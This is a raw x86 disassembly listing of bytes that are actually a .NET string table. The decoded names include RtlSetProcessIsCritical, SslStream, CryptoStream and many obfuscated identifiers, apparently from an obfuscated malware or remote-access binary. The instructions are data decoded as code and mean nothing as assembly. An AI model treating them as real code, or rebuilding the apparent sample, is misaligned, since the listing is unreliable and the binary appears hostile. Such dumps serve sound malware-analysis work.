  408f91:	74 52                	je     0x408fe5
  408f93:	4e                   	dec    %esi
  408f94:	58                   	pop    %eax
  408f95:	52                   	push   %edx
  408f96:	6c                   	insb   (%dx),%es:(%edi)
  408f97:	00 4e 64             	add    %cl,0x64(%esi)
  408f9a:	4c                   	dec    %esp
  408f9b:	73 43                	jae    0x408fe0
  408f9d:	44                   	inc    %esp
  408f9e:	6c                   	insb   (%dx),%es:(%edi)
  408f9f:	52                   	push   %edx
  408fa0:	74 77                	je     0x409019
  408fa2:	6b 61 58 6c          	imul   $0x6c,0x58(%ecx),%esp
  408fa6:	00 52 74             	add    %dl,0x74(%edx)
  408fa9:	6c                   	insb   (%dx),%es:(%edi)
  408faa:	53                   	push   %ebx
  408fab:	65 74 50             	gs je  0x408ffe
  408fae:	72 6f                	jb     0x40901f
  408fb0:	63 65 73             	arpl   %esp,0x73(%ebp)
  408fb3:	73 49                	jae    0x408ffe
  408fb5:	73 43                	jae    0x408ffa
  408fb7:	72 69                	jb     0x409022
  408fb9:	74 69                	je     0x409024
  408fbb:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408fbe:	00 4e 65             	add    %cl,0x65(%esi)
  408fc1:	74 77                	je     0x40903a
  408fc3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc4:	72 6b                	jb     0x409031
  408fc6:	43                   	inc    %ebx
  408fc7:	72 65                	jb     0x40902e
  408fc9:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408fcc:	74 69                	je     0x409037
  408fce:	61                   	popa
  408fcf:	6c                   	insb   (%dx),%es:(%edi)
  408fd0:	00 53 79             	add    %dl,0x79(%ebx)
  408fd3:	73 74                	jae    0x409049
  408fd5:	65 6d                	gs insl (%dx),%es:(%edi)
  408fd7:	2e 53                	cs push %ebx
  408fd9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408fdd:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408fe4:	6e 
  408fe5:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408fe8:	61                   	popa
  408fe9:	6c                   	insb   (%dx),%es:(%edi)
  408fea:	00 57 69             	add    %dl,0x69(%edi)
  408fed:	6e                   	outsb  %ds:(%esi),(%dx)
  408fee:	64 6f                	outsl  %fs:(%esi),(%dx)
  408ff0:	77 73                	ja     0x409065
  408ff2:	50                   	push   %eax
  408ff3:	72 69                	jb     0x40905e
  408ff5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff6:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408ff9:	61                   	popa
  408ffa:	6c                   	insb   (%dx),%es:(%edi)
  408ffb:	00 67 65             	add    %ah,0x65(%edi)
  408ffe:	74 5f                	je     0x40905f
  409000:	49                   	dec    %ecx
  409001:	6e                   	outsb  %ds:(%esi),(%dx)
  409002:	74 65                	je     0x409069
  409004:	72 76                	jb     0x40907c
  409006:	61                   	popa
  409007:	6c                   	insb   (%dx),%es:(%edi)
  409008:	00 73 65             	add    %dh,0x65(%ebx)
  40900b:	74 5f                	je     0x40906c
  40900d:	49                   	dec    %ecx
  40900e:	6e                   	outsb  %ds:(%esi),(%dx)
  40900f:	74 65                	je     0x409076
  409011:	72 76                	jb     0x409089
  409013:	61                   	popa
  409014:	6c                   	insb   (%dx),%es:(%edi)
  409015:	00 57 76             	add    %dl,0x76(%edi)
  409018:	73 7a                	jae    0x409094
  40901a:	46                   	inc    %esi
  40901b:	70 42                	jo     0x40905f
  40901d:	67 50                	addr16 push %eax
  40901f:	6a 6c                	push   $0x6c
  409021:	00 6b 65             	add    %ch,0x65(%ebx)
  409024:	72 6e                	jb     0x409094
  409026:	65 6c                	gs insb (%dx),%es:(%edi)
  409028:	33 32                	xor    (%edx),%esi
  40902a:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40902d:	6c                   	insb   (%dx),%es:(%edi)
  40902e:	00 75 73             	add    %dh,0x73(%ebp)
  409031:	65 72 33             	gs jb  0x409067
  409034:	32 2e                	xor    (%esi),%ch
  409036:	64 6c                	fs insb (%dx),%es:(%edi)
  409038:	6c                   	insb   (%dx),%es:(%edi)
  409039:	00 6e 74             	add    %ch,0x74(%esi)
  40903c:	64 6c                	fs insb (%dx),%es:(%edi)
  40903e:	6c                   	insb   (%dx),%es:(%edi)
  40903f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409042:	6c                   	insb   (%dx),%es:(%edi)
  409043:	00 4b 69             	add    %cl,0x69(%ebx)
  409046:	6c                   	insb   (%dx),%es:(%edi)
  409047:	6c                   	insb   (%dx),%es:(%edi)
  409048:	00 50 6f             	add    %dl,0x6f(%eax)
  40904b:	6c                   	insb   (%dx),%es:(%edi)
  40904c:	6c                   	insb   (%dx),%es:(%edi)
  40904d:	00 4e 6e             	add    %cl,0x6e(%esi)
  409050:	78 62                	js     0x4090b4
  409052:	42                   	inc    %edx
  409053:	49                   	dec    %ecx
  409054:	4d                   	dec    %ebp
  409055:	47                   	inc    %edi
  409056:	76 6c                	jbe    0x4090c4
  409058:	00 6c 7a 49          	add    %ch,0x49(%edx,%edi,2)
  40905c:	51                   	push   %ecx
  40905d:	78 57                	js     0x4090b6
  40905f:	41                   	inc    %ecx
  409060:	64 44                	fs inc %esp
  409062:	74 73                	je     0x4090d7
  409064:	41                   	inc    %ecx
  409065:	4d                   	dec    %ebp
  409066:	50                   	push   %eax
  409067:	6d                   	insl   (%dx),%es:(%edi)
  409068:	00 67 45             	add    %ah,0x45(%edi)
  40906b:	77 6a                	ja     0x4090d7
  40906d:	4a                   	dec    %edx
  40906e:	55                   	push   %ebp
  40906f:	70 67                	jo     0x4090d8
  409071:	52                   	push   %edx
  409072:	6d                   	insl   (%dx),%es:(%edi)
  409073:	00 69 4e             	add    %ch,0x4e(%ecx)
  409076:	4f                   	dec    %edi
  409077:	55                   	push   %ebp
  409078:	46                   	inc    %esi
  409079:	46                   	inc    %esi
  40907a:	41                   	inc    %ecx
  40907b:	79 74                	jns    0x4090f1
  40907d:	53                   	push   %ebx
  40907e:	6d                   	insl   (%dx),%es:(%edi)
  40907f:	00 41 4a             	add    %al,0x4a(%ecx)
  409082:	77 45                	ja     0x4090c9
  409084:	51                   	push   %ecx
  409085:	46                   	inc    %esi
  409086:	74 4f                	je     0x4090d7
  409088:	6c                   	insb   (%dx),%es:(%edi)
  409089:	57                   	push   %edi
  40908a:	4d                   	dec    %ebp
  40908b:	4b                   	dec    %ebx
  40908c:	72 56                	jb     0x4090e4
  40908e:	6d                   	insl   (%dx),%es:(%edi)
  40908f:	00 75 67             	add    %dh,0x67(%ebp)
  409092:	61                   	popa
  409093:	4e                   	dec    %esi
  409094:	54                   	push   %esp
  409095:	79 45                	jns    0x4090dc
  409097:	4b                   	dec    %ebx
  409098:	6f                   	outsl  %ds:(%esi),(%dx)
  409099:	70 4b                	jo     0x4090e6
  40909b:	43                   	inc    %ebx
  40909c:	57                   	push   %edi
  40909d:	4d                   	dec    %ebp
  40909e:	58                   	pop    %eax
  40909f:	6d                   	insl   (%dx),%es:(%edi)
  4090a0:	00 6b 77             	add    %ch,0x77(%ebx)
  4090a3:	47                   	inc    %edi
  4090a4:	4c                   	dec    %esp
  4090a5:	63 66 73             	arpl   %esp,0x73(%esi)
  4090a8:	72 6d                	jb     0x409117
  4090aa:	46                   	inc    %esi
  4090ab:	68 4f 62 58 6d       	push   $0x6d58624f
  4090b0:	00 52 50             	add    %dl,0x50(%edx)
  4090b3:	4f                   	dec    %edi
  4090b4:	54                   	push   %esp
  4090b5:	49                   	dec    %ecx
  4090b6:	44                   	inc    %esp
  4090b7:	64 6c                	fs insb (%dx),%es:(%edi)
  4090b9:	59                   	pop    %ecx
  4090ba:	61                   	popa
  4090bb:	6d                   	insl   (%dx),%es:(%edi)
  4090bc:	00 46 69             	add    %al,0x69(%esi)
  4090bf:	6c                   	insb   (%dx),%es:(%edi)
  4090c0:	65 53                	gs push %ebx
  4090c2:	74 72                	je     0x409136
  4090c4:	65 61                	gs popa
  4090c6:	6d                   	insl   (%dx),%es:(%edi)
  4090c7:	00 4e 65             	add    %cl,0x65(%esi)
  4090ca:	74 77                	je     0x409143
  4090cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4090cd:	72 6b                	jb     0x40913a
  4090cf:	53                   	push   %ebx
  4090d0:	74 72                	je     0x409144
  4090d2:	65 61                	gs popa
  4090d4:	6d                   	insl   (%dx),%es:(%edi)
  4090d5:	00 53 73             	add    %dl,0x73(%ebx)
  4090d8:	6c                   	insb   (%dx),%es:(%edi)
  4090d9:	53                   	push   %ebx
  4090da:	74 72                	je     0x40914e
  4090dc:	65 61                	gs popa
  4090de:	6d                   	insl   (%dx),%es:(%edi)
  4090df:	00 43 72             	add    %al,0x72(%ebx)
  4090e2:	79 70                	jns    0x409154
  4090e4:	74 6f                	je     0x409155
  4090e6:	53                   	push   %ebx
  4090e7:	74 72                	je     0x40915b
  4090e9:	65 61                	gs popa
  4090eb:	6d                   	insl   (%dx),%es:(%edi)
  4090ec:	00 47 5a             	add    %al,0x5a(%edi)
  4090ef:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4090f6:	6d                   	insl   (%dx),%es:(%edi)
  4090f7:	00 4d 65             	add    %cl,0x65(%ebp)
  4090fa:	6d                   	insl   (%dx),%es:(%edi)
  4090fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4090fc:	72 79                	jb     0x409177
  4090fe:	53                   	push   %ebx
  4090ff:	74 72                	je     0x409173
  409101:	65 61                	gs popa
  409103:	6d                   	insl   (%dx),%es:(%edi)
  409104:	00 67 65             	add    %ah,0x65(%edi)
  409107:	74 5f                	je     0x409168
  409109:	49                   	dec    %ecx
  40910a:	74 65                	je     0x409171
  40910c:	6d                   	insl   (%dx),%es:(%edi)
  40910d:	00 67 65             	add    %ah,0x65(%edi)
  409110:	74 5f                	je     0x409171
  409112:	49                   	dec    %ecx
  409113:	73 36                	jae    0x40914b
  409115:	34 42                	xor    $0x42,%al
  409117:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40911e:	74 
  40911f:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409126:	65 6d                	gs insl (%dx),%es:(%edi)
  409128:	00 53 79             	add    %dl,0x79(%ebx)
  40912b:	6d                   	insl   (%dx),%es:(%edi)
  40912c:	6d                   	insl   (%dx),%es:(%edi)
  40912d:	65 74 72             	gs je  0x4091a2
  409130:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409137:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40913e:	79 
  40913f:	6d                   	insl   (%dx),%es:(%edi)
  409140:	6d                   	insl   (%dx),%es:(%edi)
  409141:	65 74 72             	gs je  0x4091b6
  409144:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40914b:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  409152:	73 
  409153:	68 41 6c 67 6f       	push   $0x6f676c41
  409158:	72 69                	jb     0x4091c3
  40915a:	74 68                	je     0x4091c4
  40915c:	6d                   	insl   (%dx),%es:(%edi)
  40915d:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  409161:	6d                   	insl   (%dx),%es:(%edi)
  409162:	00 55 6b             	add    %dl,0x6b(%ebp)
  409165:	4c                   	dec    %esp
  409166:	47                   	inc    %edi
  409167:	7a 77                	jp     0x4091e0
  409169:	42                   	inc    %edx
  40916a:	4f                   	dec    %edi
  40916b:	75 6a                	jne    0x4091d7
  40916d:	6d                   	insl   (%dx),%es:(%edi)
  40916e:	00 4d 76             	add    %cl,0x76(%ebp)
  409171:	74 5a                	je     0x4091cd
  409173:	55                   	push   %ebp
  409174:	76 43                	jbe    0x4091b9
  409176:	62 4f 58             	bound  %ecx,0x58(%edi)
  409179:	6c                   	insb   (%dx),%es:(%edi)
  40917a:	52                   	push   %edx
  40917b:	75 55                	jne    0x4091d2
  40917d:	6d                   	insl   (%dx),%es:(%edi)
  40917e:	6d                   	insl   (%dx),%es:(%edi)
  40917f:	00 52 61             	add    %dl,0x61(%edx)
  409182:	6e                   	outsb  %ds:(%esi),(%dx)
  409183:	64 6f                	outsl  %fs:(%esi),(%dx)
  409185:	6d                   	insl   (%dx),%es:(%edi)
  409186:	00 49 43             	add    %cl,0x43(%ecx)
  409189:	72 79                	jb     0x409204
  40918b:	70 74                	jo     0x409201
  40918d:	6f                   	outsl  %ds:(%esi),(%dx)
  40918e:	54                   	push   %esp
  40918f:	72 61                	jb     0x4091f2
  409191:	6e                   	outsb  %ds:(%esi),(%dx)
  409192:	73 66                	jae    0x4091fa
  409194:	6f                   	outsl  %ds:(%esi),(%dx)
  409195:	72 6d                	jb     0x409204
  409197:	00 45 6e             	add    %al,0x6e(%ebp)
  40919a:	75 6d                	jne    0x409209
  40919c:	00 6f 71             	add    %ch,0x71(%edi)
  40919f:	67 50                	addr16 push %eax
  4091a1:	5a                   	pop    %edx
  4091a2:	54                   	push   %esp
  4091a3:	74 53                	je     0x4091f8
  4091a5:	46                   	inc    %esi
  4091a6:	5a                   	pop    %edx
  4091a7:	58                   	pop    %eax
  4091a8:	7a 6d                	jp     0x409217
  4091aa:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4091ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4091af:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b0:	6c                   	insb   (%dx),%es:(%edi)
  4091b1:	65 61                	gs popa
  4091b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b4:	00 4d 61             	add    %cl,0x61(%ebp)
  4091b7:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4091be:	43                   	inc    %ebx
  4091bf:	68 61 69 6e 00       	push   $0x6e6961
  4091c4:	41                   	inc    %ecx
  4091c5:	70 70                	jo     0x409237
  4091c7:	44                   	inc    %esp
  4091c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c9:	6d                   	insl   (%dx),%es:(%edi)
  4091ca:	61                   	popa
  4091cb:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4091d2:	43                   	inc    %ebx
  4091d3:	75 72                	jne    0x409247
  4091d5:	72 65                	jb     0x40923c
  4091d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d8:	74 44                	je     0x40921e
  4091da:	6f                   	outsl  %ds:(%esi),(%dx)
  4091db:	6d                   	insl   (%dx),%es:(%edi)
  4091dc:	61                   	popa
  4091dd:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4091e4:	00 49 75             	add    %cl,0x75(%ecx)
  4091e7:	48                   	dec    %eax
  4091e8:	59                   	pop    %ecx
  4091e9:	66 54                	push   %sp
  4091eb:	48                   	dec    %eax
  4091ec:	73 6b                	jae    0x409259
  4091ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ef:	00 47 65             	add    %al,0x65(%edi)
  4091f2:	74 46                	je     0x40923a
  4091f4:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4091fb:	57 
  4091fc:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409203:	78 
  409204:	74 65                	je     0x40926b
  409206:	6e                   	outsb  %ds:(%esi),(%dx)
  409207:	73 69                	jae    0x409272
  409209:	6f                   	outsl  %ds:(%esi),(%dx)
  40920a:	6e                   	outsb  %ds:(%esi),(%dx)
  40920b:	00 67 65             	add    %ah,0x65(%edi)
  40920e:	74 5f                	je     0x40926f
  409210:	4f                   	dec    %edi
  409211:	53                   	push   %ebx
  409212:	56                   	push   %esi
  409213:	65 72 73             	gs jb  0x409289
  409216:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40921d:	74 65                	je     0x409284
  40921f:	6d                   	insl   (%dx),%es:(%edi)
  409220:	2e 49                	cs dec %ecx
  409222:	4f                   	dec    %edi
  409223:	2e 43                	cs inc %ebx
  409225:	6f                   	outsl  %ds:(%esi),(%dx)
  409226:	6d                   	insl   (%dx),%es:(%edi)
  409227:	70 72                	jo     0x40929b
  409229:	65 73 73             	gs jae 0x40929f
  40922c:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  409233:	6c                   	insb   (%dx),%es:(%edi)
  409234:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40923b:	00 53 79             	add    %dl,0x79(%ebx)
  40923e:	73 74                	jae    0x4092b4
  409240:	65 6d                	gs insl (%dx),%es:(%edi)
  409242:	2e 53                	cs push %ebx
  409244:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409248:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40924f:	68 
  409250:	65 6e                	outsb  %gs:(%esi),(%dx)
  409252:	74 69                	je     0x4092bd
  409254:	63 61 74             	arpl   %esp,0x74(%ecx)
  409257:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40925e:	74 65                	je     0x4092c5
  409260:	6d                   	insl   (%dx),%es:(%edi)
  409261:	2e 52                	cs push %edx
  409263:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  409266:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40926b:	6e                   	outsb  %ds:(%esi),(%dx)
  40926c:	00 58 35             	add    %bl,0x35(%eax)
  40926f:	30 39                	xor    %bh,(%ecx)
  409271:	43                   	inc    %ebx
  409272:	65 72 74             	gs jb  0x4092e9
  409275:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40927c:	43                   	inc    %ebx
  40927d:	6f                   	outsl  %ds:(%esi),(%dx)
  40927e:	6c                   	insb   (%dx),%es:(%edi)
  40927f:	6c                   	insb   (%dx),%es:(%edi)
  409280:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409285:	6e                   	outsb  %ds:(%esi),(%dx)
  409286:	00 4d 61             	add    %cl,0x61(%ebp)
  409289:	6e                   	outsb  %ds:(%esi),(%dx)
  40928a:	61                   	popa
  40928b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40928e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409290:	74 4f                	je     0x4092e1
  409292:	62 6a 65             	bound  %ebp,0x65(%edx)
  409295:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409299:	6c                   	insb   (%dx),%es:(%edi)
  40929a:	6c                   	insb   (%dx),%es:(%edi)
  40929b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a1:	00 73 65             	add    %dh,0x65(%ebx)
  4092a4:	74 5f                	je     0x409305
  4092a6:	50                   	push   %eax
  4092a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4092a8:	73 69                	jae    0x409313
  4092aa:	74 69                	je     0x409315
  4092ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ae:	00 43 72             	add    %al,0x72(%ebx)
  4092b1:	79 70                	jns    0x409323
  4092b3:	74 6f                	je     0x409324
  4092b5:	67 72 61             	addr16 jb 0x409319
  4092b8:	70 68                	jo     0x409322
  4092ba:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4092c1:	74 69                	je     0x40932c
  4092c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c5:	00 41 72             	add    %al,0x72(%ecx)
  4092c8:	67 75 6d             	addr16 jne 0x409338
  4092cb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092cd:	74 4e                	je     0x40931d
  4092cf:	75 6c                	jne    0x40933d
  4092d1:	6c                   	insb   (%dx),%es:(%edi)
  4092d2:	45                   	inc    %ebp
  4092d3:	78 63                	js     0x409338
  4092d5:	65 70 74             	gs jo  0x40934c
  4092d8:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  4092df:	75 6d                	jne    0x40934e
  4092e1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092e3:	74 45                	je     0x40932a
  4092e5:	78 63                	js     0x40934a
  4092e7:	65 70 74             	gs jo  0x40935e
  4092ea:	69 6f 6e 00 76 66 61 	imul   $0x61667600,0x6e(%edi),%ebp
  4092f1:	51                   	push   %ecx
  4092f2:	66 65 58             	gs pop %ax
  4092f5:	59                   	pop    %ecx
  4092f6:	51                   	push   %ecx
  4092f7:	72 6e                	jb     0x409367
  4092f9:	00 77 79             	add    %dh,0x79(%edi)
  4092fc:	4b                   	dec    %ebx
  4092fd:	57                   	push   %edi
  4092fe:	68 72 4c 42 46       	push   $0x46424c72
  409303:	66 77 59             	data16 ja 0x40935f
  409306:	79 78                	jns    0x409380
  409308:	6e                   	outsb  %ds:(%esi),(%dx)
  409309:	00 73 42             	add    %dh,0x42(%ebx)
  40930c:	44                   	inc    %esp
  40930d:	62 6b 4d             	bound  %ebp,0x4d(%ebx)
  409310:	72 6c                	jb     0x40937e
  409312:	42                   	inc    %edx
  409313:	4f                   	dec    %edi
  409314:	7a 52                	jp     0x409368
  409316:	57                   	push   %edi
  409317:	72 55                	jb     0x40936e
  409319:	6f                   	outsl  %ds:(%esi),(%dx)
  40931a:	00 73 4c             	add    %dh,0x4c(%ebx)
  40931d:	65 79 49             	gs jns 0x409369
  409320:	43                   	inc    %ebx
  409321:	45                   	inc    %ebp
  409322:	48                   	dec    %eax
  409323:	6e                   	outsb  %ds:(%esi),(%dx)
  409324:	54                   	push   %esp
  409325:	62 6e 56             	bound  %ebp,0x56(%esi)
  409328:	6f                   	outsl  %ds:(%esi),(%dx)
  409329:	00 71 4d             	add    %dh,0x4d(%ecx)
  40932c:	6f                   	outsl  %ds:(%esi),(%dx)
  40932d:	67 67 70 66          	addr16 addr16 jo 0x409397
  409331:	58                   	pop    %eax
  409332:	65 6f                	outsl  %gs:(%esi),(%dx)
  409334:	00 49 6d             	add    %cl,0x6d(%ecx)
  409337:	61                   	popa
  409338:	67 65 43             	addr16 gs inc %ebx
  40933b:	6f                   	outsl  %ds:(%esi),(%dx)
  40933c:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  409341:	66 6f                	outsw  %ds:(%esi),(%dx)
  409343:	00 46 69             	add    %al,0x69(%esi)
  409346:	6c                   	insb   (%dx),%es:(%edi)
  409347:	65 49                	gs dec %ecx
  409349:	6e                   	outsb  %ds:(%esi),(%dx)
  40934a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40934c:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  409350:	76 65                	jbe    0x4093b7
  409352:	49                   	dec    %ecx
  409353:	6e                   	outsb  %ds:(%esi),(%dx)
  409354:	66 6f                	outsw  %ds:(%esi),(%dx)
  409356:	00 46 69             	add    %al,0x69(%esi)
  409359:	6c                   	insb   (%dx),%es:(%edi)
  40935a:	65 53                	gs push %ebx
  40935c:	79 73                	jns    0x4093d1
  40935e:	74 65                	je     0x4093c5
  409360:	6d                   	insl   (%dx),%es:(%edi)
  409361:	49                   	dec    %ecx
  409362:	6e                   	outsb  %ds:(%esi),(%dx)
  409363:	66 6f                	outsw  %ds:(%esi),(%dx)
  409365:	00 43 6f             	add    %al,0x6f(%ebx)
  409368:	6d                   	insl   (%dx),%es:(%edi)
  409369:	70 75                	jo     0x4093e0
  40936b:	74 65                	je     0x4093d2
  40936d:	72 49                	jb     0x4093b8
  40936f:	6e                   	outsb  %ds:(%esi),(%dx)
  409370:	66 6f                	outsw  %ds:(%esi),(%dx)
  409372:	00 43 53             	add    %al,0x53(%ebx)
  409375:	68 61 72 70 41       	push   $0x41707261
  40937a:	72 67                	jb     0x4093e3
  40937c:	75 6d                	jne    0x4093eb
  40937e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409380:	74 49                	je     0x4093cb
  409382:	6e                   	outsb  %ds:(%esi),(%dx)
  409383:	66 6f                	outsw  %ds:(%esi),(%dx)
  409385:	00 50 72             	add    %dl,0x72(%eax)
  409388:	6f                   	outsl  %ds:(%esi),(%dx)
  409389:	63 65 73             	arpl   %esp,0x73(%ebp)
  40938c:	73 53                	jae    0x4093e1
  40938e:	74 61                	je     0x4093f1
  409390:	72 74                	jb     0x409406
  409392:	49                   	dec    %ecx
  409393:	6e                   	outsb  %ds:(%esi),(%dx)
  409394:	66 6f                	outsw  %ds:(%esi),(%dx)
  409396:	00 5a 65             	add    %bl,0x65(%edx)
  409399:	73 6f                	jae    0x40940a
  40939b:	54                   	push   %esp
  40939c:	73 6f                	jae    0x40940d
  40939e:	43                   	inc    %ebx
  40939f:	77 46                	ja     0x4093e7
  4093a1:	59                   	pop    %ecx
  4093a2:	7a 69                	jp     0x40940d
  4093a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4093a5:	00 4a 73             	add    %cl,0x73(%edx)
  4093a8:	75 65                	jne    0x40940f
  4093aa:	79 53                	jns    0x4093ff
  4093ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ad:	55                   	push   %ebp
  4093ae:	42                   	inc    %edx
  4093af:	57                   	push   %edi
  4093b0:	77 71                	ja     0x409423
  4093b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4093b3:	00 4a 73             	add    %cl,0x73(%edx)
  4093b6:	5a                   	pop    %edx
  4093b7:	71 7a                	jno    0x409433
  4093b9:	59                   	pop    %ecx
  4093ba:	78 6c                	js     0x409428
  4093bc:	53                   	push   %ebx
  4093bd:	61                   	popa
  4093be:	77 6f                	ja     0x40942f
  4093c0:	00 46 48             	add    %al,0x48(%esi)
  4093c3:	73 77                	jae    0x40943c
  4093c5:	63 6f 55             	arpl   %ebp,0x55(%edi)
  4093c8:	59                   	pop    %ecx
  4093c9:	59                   	pop    %ecx
  4093ca:	79 6f                	jns    0x40943b
  4093cc:	00 56 6b             	add    %dl,0x6b(%esi)
  4093cf:	50                   	push   %eax
  4093d0:	78 50                	js     0x409422
  4093d2:	63 72 70             	arpl   %esi,0x70(%edx)
  4093d5:	79 79                	jns    0x409450
  4093d7:	44                   	inc    %esp
  4093d8:	70 00                	jo     0x4093da
  4093da:	45                   	inc    %ebp
  4093db:	76 44                	jbe    0x409421
  4093dd:	64 46                	fs inc %esi
  4093df:	71 54                	jno    0x409435
  4093e1:	53                   	push   %ebx
  4093e2:	58                   	pop    %eax
  4093e3:	70 00                	jo     0x4093e5
  4093e5:	46                   	inc    %esi
  4093e6:	59                   	pop    %ecx
  4093e7:	55                   	push   %ebp
  4093e8:	7a 71                	jp     0x40945b
  4093ea:	47                   	inc    %edi
  4093eb:	47                   	inc    %edi
  4093ec:	6c                   	insb   (%dx),%es:(%edi)
  4093ed:	58                   	pop    %eax
  4093ee:	70 00                	jo     0x4093f0
  4093f0:	47                   	inc    %edi
  4093f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f2:	59                   	pop    %ecx
  4093f3:	4e                   	dec    %esi
  4093f4:	5a                   	pop    %edx
  4093f5:	72 65                	jb     0x40945c
  4093f7:	53                   	push   %ebx
  4093f8:	63 59 61             	arpl   %ebx,0x61(%ecx)
  4093fb:	70 00                	jo     0x4093fd
  4093fd:	48                   	dec    %eax
  4093fe:	51                   	push   %ecx
  4093ff:	66 72 70             	data16 jb 0x409472
  409402:	71 41                	jno    0x409445
  409404:	4a                   	dec    %edx
  409405:	42                   	inc    %edx
  409406:	71 4b                	jno    0x409453
  409408:	62 70 00             	bound  %esi,0x0(%eax)
  40940b:	53                   	push   %ebx
  40940c:	6c                   	insb   (%dx),%es:(%edi)
  40940d:	65 65 70 00          	gs gs jo 0x409411
  409411:	44                   	inc    %esp
  409412:	59                   	pop    %ecx
  409413:	5a                   	pop    %edx
  409414:	42                   	inc    %edx
  409415:	75 68                	jne    0x40947f
  409417:	70 6a                	jo     0x409483
  409419:	46                   	inc    %esi
  40941a:	6e                   	outsb  %ds:(%esi),(%dx)
  40941b:	70 00                	jo     0x40941d
  40941d:	55                   	push   %ebp
  40941e:	4d                   	dec    %ebp
  40941f:	6a 67                	push   $0x67
  409421:	43                   	inc    %ebx
  409422:	6d                   	insl   (%dx),%es:(%edi)
  409423:	70 79                	jo     0x40949e
  409425:	6e                   	outsb  %ds:(%esi),(%dx)
  409426:	70 00                	jo     0x409428
  409428:	4d                   	dec    %ebp
  409429:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409430:	74 2e                	je     0x409460
  409432:	43                   	inc    %ebx
  409433:	53                   	push   %ebx
  409434:	68 61 72 70 00       	push   $0x707261
  409439:	68 57 45 79 78       	push   $0x78794557
  40943e:	70 4a                	jo     0x40948a
  409440:	78 58                	js     0x40949a
  409442:	44                   	inc    %esp
  409443:	71 00                	jno    0x409445
  409445:	6f                   	outsl  %ds:(%esi),(%dx)
  409446:	4e                   	dec    %esi
  409447:	73 4e                	jae    0x409497
  409449:	6c                   	insb   (%dx),%es:(%edi)
  40944a:	41                   	inc    %ecx
  40944b:	71 69                	jno    0x4094b6
  40944d:	67 6e                	outsb  %ds:(%si),(%dx)
  40944f:	65 49                	gs dec %ecx
  409451:	71 00                	jno    0x409453
  409453:	71 43                	jno    0x409498
  409455:	50                   	push   %eax
  409456:	66 66 64 6f          	data16 outsw %fs:(%esi),(%dx)
  40945a:	4f                   	dec    %edi
